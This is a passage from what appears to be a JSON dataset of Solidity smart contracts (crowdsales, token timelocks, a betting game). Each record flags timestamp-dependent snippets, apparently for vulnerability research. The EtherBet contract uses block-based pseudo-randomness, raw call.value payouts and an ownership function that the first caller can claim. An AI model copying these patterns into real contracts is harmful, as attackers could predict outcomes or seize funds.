bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress)\n revert();\n if (customerId == 0)\n revert();\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address addr, uint128 customerId) public payable {\n if (requiredSignedAddress)\n revert();\n if (customerId == 0)\n revert();\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if (requireCustomerId)\n revert();\n if (requiredSignedAddress)\n revert();\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if (finalized) {\n revert();\n }\n if (address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if (!finalizeAgent.isFinalizeAgent()) {\n revert();\n }\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setBaseEthCap(uint _baseEthCap) onlyOwner {\n if (_baseEthCap == 0)\n revert();\n baseEthCap = _baseEthCap;\n BaseEthCapChanged(baseEthCap);\n }\n function setMaxEthPerAddress(uint _maxEthPerAddress) onlyOwner {\n if(_maxEthPerAddress == 0)\n revert();\n maxEthPerAddress = _maxEthPerAddress;\n MaxEthPerAddressChanged(maxEthPerAddress);\n }\n function setEndsAt(uint time) onlyOwner {\n if (now > time) {\n revert();\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if (!pricingStrategy.isPricingStrategy()) {\n revert();\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if (investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n revert();\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if (msg.value == 0)\n revert();\n loadedRefund = loadedRefund.add(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0)\n revert();\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.add(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue))\n revert();\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if (finalized)\n return State.Finalized;\n else if (address(finalizeAgent) == 0)\n return State.Preparing;\n else if (!finalizeAgent.isSane())\n return State.Preparing;\n else if (!pricingStrategy.isSane(address(this)))\n return State.Preparing;\n else if (block.timestamp < startsAt)\n return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull())\n return State.Funding;\n else if (isMinimumGoalReached())\n return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised)\n return State.Refunding;\n else\n return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if (getState() != state)\n revert();\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n revert();\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n revert();\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n revert();\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract DefaultFinalizeAgent is FinalizeAgent {\n ReleasableToken public token;\n Crowdsale public crowdsale;\n function DefaultFinalizeAgent(ReleasableToken _token, Crowdsale _crowdsale) {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function finalizeCrowdsale() public {\n if (msg.sender != address(crowdsale)) {\n revert();\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getCurrentFgcCap() public constant returns (uint) {\nif (block.timestamp < startsAt)\nreturn maxEthPerAddress;\nuint timeSinceStart = block.timestamp.sub(startsAt);\nuint currentPeriod = timeSinceStart.div(TIME_PERIOD_IN_SEC).add(1);\nif (currentPeriod < 2) {\nreturn 5000 * 10**token.decimals();\n}\nif (currentPeriod > 2 && currentPeriod < 5) {\nreturn 1000 * 10**token.decimals();\n}\nif (currentPeriod > 4 && currentPeriod < 6) {\nreturn 500 * 10**token.decimals();\n}\nif (currentPeriod > 5 && currentPeriod < 9) {\nreturn 200 * 10**token.decimals();\n}\nif (currentPeriod > 8 && currentPeriod < 11) {\nreturn 100 * 10**token.decimals();\n}\nreturn maxEthPerAddress;\n}",
    "function getState() public constant returns (State) {\nif (finalized)\nreturn State.Finalized;\nelse if (address(finalizeAgent) == 0)\nreturn State.Preparing;\nelse if (!finalizeAgent.isSane())\nreturn State.Preparing;\nelse if (!pricingStrategy.isSane(address(this)))\nreturn State.Preparing;\nelse if (block.timestamp < startsAt)\nreturn State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull())\nreturn State.Funding;\nelse if (isMinimumGoalReached())\nreturn State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised)\nreturn State.Refunding;\nelse\nreturn State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f71"
  },
  "filename": "9210.sol",
  "content": "pragma solidity ^0.4.15;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) revert();\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) revert();\n _;\n }\n modifier onlyInEmergency {\n if (!halted) revert();\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy is Ownable {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\ncontract Crowdsale is Haltable {\n uint public constant TIME_PERIOD_IN_SEC = 1 days;\n uint public baseEthCap;\n uint public maxEthPerAddress;\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMath for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint256 public tokensSold = 0;\n uint256 public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint256 weiAmount, uint256 tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event EndsAtChanged(uint newEndsAt);\n event BaseEthCapChanged(uint newBaseEthCap);\n event MaxEthPerAddressChanged(uint newMaxEthPerAddress);\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _baseEthCap, uint _maxEthPerAddress) {\n owner = msg.sender;\n baseEthCap = _baseEthCap;\n maxEthPerAddress = _maxEthPerAddress;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if (multisigWallet == 0) {\n revert();\n }\n if (_start == 0) {\n revert();\n }\n startsAt = _start;\n if (_end == 0) {\n revert();\n }\n endsAt = _end;\n if (startsAt >= endsAt) {\n revert();\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function() payable {\n buy();\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n if (tokenAmount == 0) {\n revert();\n }\n uint currentFgcCap = getCurrentFgcCap();\n if (tokenAmount > currentFgcCap) {\n revert();\n }\n if (investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].add(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].add(tokenAmount);\n weiRaised = weiRaised.add(weiAmount);\n tokensSold = tokensSold.add(tokenAmount);\n if (pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.add(weiAmount);\n }\n if (isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n revert();\n }\n assignTokens(receiver, tokenAmount);\n if (!multisigWallet.send(weiAmount))\n revert();\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function getCurrentFgcCap() public constant returns (uint) {\n if (block.timestamp < startsAt)\n return maxEthPerAddress;\n uint timeSinceStart = block.timestamp.sub(startsAt);\n uint currentPeriod = timeSinceStart.div(TIME_PERIOD_IN_SEC).add(1);\n if (currentPeriod < 2) {\n return 5000 * 10**token.decimals();\n }\n if (currentPeriod > 2 && currentPeriod < 5) {\n return 1000 * 10**token.decimals();\n }\n if (currentPeriod > 4 && currentPeriod < 6) {\n return 500 * 10**token.decimals();\n }\n if (currentPeriod > 5 && currentPeriod < 9) {\n return 200 * 10**token.decimals();\n }\n if (currentPeriod > 8 && currentPeriod < 11) {\n return 100 * 10**token.decimals();\n }\n return maxEthPerAddress;\n }\n function preallocate(address receiver, uint256 fullTokens, uint256 weiPrice) public onlyOwner {\n uint256 tokenAmount = fullTokens;\n uint256 weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.add(weiAmount);\n tokensSold = tokensSold.add(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].add(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].add(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress)\n revert();\n if (customerId == 0)\n revert();\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address addr, uint128 customerId) public payable {\n if (requiredSignedAddress)\n revert();\n if (customerId == 0)\n revert();\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if (requireCustomerId)\n revert();\n if (requiredSignedAddress)\n revert();\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if (finalized) {\n revert();\n }\n if (address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if (!finalizeAgent.isFinalizeAgent()) {\n revert();\n }\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setBaseEthCap(uint _baseEthCap) onlyOwner {\n if (_baseEthCap == 0)\n revert();\n baseEthCap = _baseEthCap;\n BaseEthCapChanged(baseEthCap);\n }\n function setMaxEthPerAddress(uint _maxEthPerAddress) onlyOwner {\n if(_maxEthPerAddress == 0)\n revert();\n maxEthPerAddress = _maxEthPerAddress;\n MaxEthPerAddressChanged(maxEthPerAddress);\n }\n function setEndsAt(uint time) onlyOwner {\n if (now > time) {\n revert();\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if (!pricingStrategy.isPricingStrategy()) {\n revert();\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if (investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n revert();\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if (msg.value == 0)\n revert();\n loadedRefund = loadedRefund.add(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0)\n revert();\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.add(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue))\n revert();\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if (finalized)\n return State.Finalized;\n else if (address(finalizeAgent) == 0)\n return State.Preparing;\n else if (!finalizeAgent.isSane())\n return State.Preparing;\n else if (!pricingStrategy.isSane(address(this)))\n return State.Preparing;\n else if (block.timestamp < startsAt)\n return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull())\n return State.Funding;\n else if (isMinimumGoalReached())\n return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised)\n return State.Refunding;\n else\n return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if (getState() != state)\n revert();\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract AllocatedCrowdsale is Crowdsale {\n address public beneficiary;\n function AllocatedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, address _beneficiary, uint baseEthCap, uint maxEthPerAddress)\n Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, baseEthCap, maxEthPerAddress) {\n beneficiary = _beneficiary;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n if (tokenAmount > getTokensLeft()) {\n return true;\n } else {\n return false;\n }\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return getTokensLeft() == 0;\n }\n function getTokensLeft() public constant returns (uint) {\n return token.allowance(owner, this);\n }\n function assignTokens(address receiver, uint256 tokenAmount) private {\n if (!token.transferFrom(beneficiary, receiver, tokenAmount))\n revert();\n }\n}",
  "extract_feature": [
    "function getCurrentFgcCap() public constant returns (uint) {\nif (block.timestamp < startsAt)\nreturn maxEthPerAddress;\nuint timeSinceStart = block.timestamp.sub(startsAt);\nuint currentPeriod = timeSinceStart.div(TIME_PERIOD_IN_SEC).add(1);\nif (currentPeriod < 2) {\nreturn 5000 * 10**token.decimals();\n}\nif (currentPeriod > 2 && currentPeriod < 5) {\nreturn 1000 * 10**token.decimals();\n}\nif (currentPeriod > 4 && currentPeriod < 6) {\nreturn 500 * 10**token.decimals();\n}\nif (currentPeriod > 5 && currentPeriod < 9) {\nreturn 200 * 10**token.decimals();\n}\nif (currentPeriod > 8 && currentPeriod < 11) {\nreturn 100 * 10**token.decimals();\n}\nreturn maxEthPerAddress;\n}",
    "function getState() public constant returns (State) {\nif (finalized)\nreturn State.Finalized;\nelse if (address(finalizeAgent) == 0)\nreturn State.Preparing;\nelse if (!finalizeAgent.isSane())\nreturn State.Preparing;\nelse if (!pricingStrategy.isSane(address(this)))\nreturn State.Preparing;\nelse if (block.timestamp < startsAt)\nreturn State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull())\nreturn State.Funding;\nelse if (isMinimumGoalReached())\nreturn State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised)\nreturn State.Refunding;\nelse\nreturn State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f72"
  },
  "filename": "9221.sol",
  "content": "pragma solidity ^0.4.24;\ncontract EtherBet{\n address gameOwner = address(0);\n bool locked = false;\n function bet() payable\n {\n if ((random()%2==1) && (msg.value == 1 ether) && (!locked))\n {\n if (!msg.sender.call.value(2 ether)())\n throw;\n }\n }\n function lock()\n {\n if (gameOwner==msg.sender)\n {\n locked = true;\n }\n }\n function unlock()\n {\n if (gameOwner==msg.sender)\n {\n locked = false;\n }\n }\n function own(address owner)\n {\n if ((gameOwner == address(0)) || (gameOwner == msg.sender))\n {\n gameOwner = owner;\n }\n }\n function releaseFunds(uint amount)\n {\n if (gameOwner==msg.sender)\n {\n if (!msg.sender.call.value( amount * (1 ether))())\n throw;\n }\n }\n function random() view returns (uint8) {\n return uint8(uint256(keccak256(block.timestamp, block.difficulty))%256);\n }\n function () public payable\n {\n bet();\n }\n}",
  "extract_feature": [
    "function random() view returns (uint8) {\nreturn uint8(uint256(keccak256(block.timestamp, block.difficulty))%256);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f73"
  },
  "filename": "9224.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) internal balances;\n uint256 internal totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint64 public releaseTime;\n constructor(ERC20Basic _token, address _beneficiary, uint64 _releaseTime) public {\n require(_releaseTime > uint64(block.timestamp));\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(uint64(block.timestamp) >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract Owned {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n}\ncontract DepoToken is StandardToken, BurnableToken, Owned {\n string public constant name = \"Depository Network Token\";\n string public constant symbol = \"DEPO\";\n uint8 public constant decimals = 18;\n uint256 public constant HARD_CAP = 3000000000 * 10**uint256(decimals);\n address public saleTokensAddress;\n address public bountyTokensAddress;\n address public reserveTokensAddress;\n address public teamTokensAddress;\n address public advisorsTokensAddress;\n TokenTimelock public teamTokensLock;\n bool public saleClosed = false;\n mapping(address => bool) public whitelisted;\n modifier beforeEnd {\n require(!saleClosed);\n _;\n }\n constructor(address _teamTokensAddress, address _advisorsTokensAddress, address _reserveTokensAddress,\n address _saleTokensAddress, address _bountyTokensAddress) public {\n require(_teamTokensAddress != address(0));\n require(_advisorsTokensAddress != address(0));\n require(_reserveTokensAddress != address(0));\n require(_saleTokensAddress != address(0));\n require(_bountyTokensAddress != address(0));\n teamTokensAddress = _teamTokensAddress;\n advisorsTokensAddress = _advisorsTokensAddress;\n reserveTokensAddress = _reserveTokensAddress;\n saleTokensAddress = _saleTokensAddress;\n bountyTokensAddress = _bountyTokensAddress;\n whitelisted[saleTokensAddress] = true;\n whitelisted[bountyTokensAddress] = true;\n uint256 saleTokens = 1500000000 * 10**uint256(decimals);\n totalSupply_ = saleTokens;\n balances[saleTokensAddress] = saleTokens;\n emit Transfer(address(0), saleTokensAddress, saleTokens);\n uint256 bountyTokens = 180000000 * 10**uint256(decimals);\n totalSupply_ = totalSupply_.add(bountyTokens);\n balances[bountyTokensAddress] = bountyTokens;\n emit Transfer(address(0), bountyTokensAddress, bountyTokens);\n uint256 reserveTokens = 780000000 * 10**uint256(decimals);\n totalSupply_ = totalSupply_.add(reserveTokens);\n balances[reserveTokensAddress] = reserveTokens;\n emit Transfer(address(0), reserveTokensAddress, reserveTokens);\n uint256 teamTokens = 360000000 * 10**uint256(decimals);\n totalSupply_ = totalSupply_.add(teamTokens);\n teamTokensLock = new TokenTimelock(this, teamTokensAddress, uint64(now + 2 * 365 days));\n balances[address(teamTokensLock)] = teamTokens;\n emit Transfer(address(0), address(teamTokensLock), teamTokens);\n uint256 advisorsTokens = 180000000 * 10**uint256(decimals);\n totalSupply_ = totalSupply_.add(advisorsTokens);\n balances[advisorsTokensAddress] = advisorsTokens;\n emit Transfer(address(0), advisorsTokensAddress, advisorsTokens);\n require(totalSupply_ <= HARD_CAP);\n }\n function close() public onlyOwner beforeEnd {\n saleClosed = true;\n }\n function whitelist(address _address) external onlyOwner {\n whitelisted[_address] = true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n if(!saleClosed) return false;\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n if(!saleClosed && !whitelisted[msg.sender]) return false;\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function release() public {\nrequire(uint64(block.timestamp) >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f74"
  },
  "filename": "9230.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Tokenlock is Ownable {\n using SafeERC20 for ERC20;\n event LockStarted(uint256 now, uint256 interval);\n event TokenLocked(address indexed buyer, uint256 amount);\n event TokenReleased(address indexed buyer, uint256 amount);\n mapping (address => uint256) public buyers;\n address public locker;\n address public distributor;\n ERC20 public Token;\n bool public started = false;\n uint256 public interval;\n uint256 public releaseTime;\n constructor(address token, uint256 time) public {\n require(token != address(0));\n Token = ERC20(token);\n interval = time;\n locker = owner;\n distributor = owner;\n }\n function setLocker(address addr)\n external\n onlyOwner\n {\n require(addr != address(0));\n locker = addr;\n }\n function setDistributor(address addr)\n external\n onlyOwner\n {\n require(addr != address(0));\n distributor = addr;\n }\n function lock(address beneficiary, uint256 amount)\n external\n {\n require(msg.sender == locker);\n require(beneficiary != address(0));\n buyers[beneficiary] += amount;\n emit TokenLocked(beneficiary, buyers[beneficiary]);\n }\n function start()\n external\n 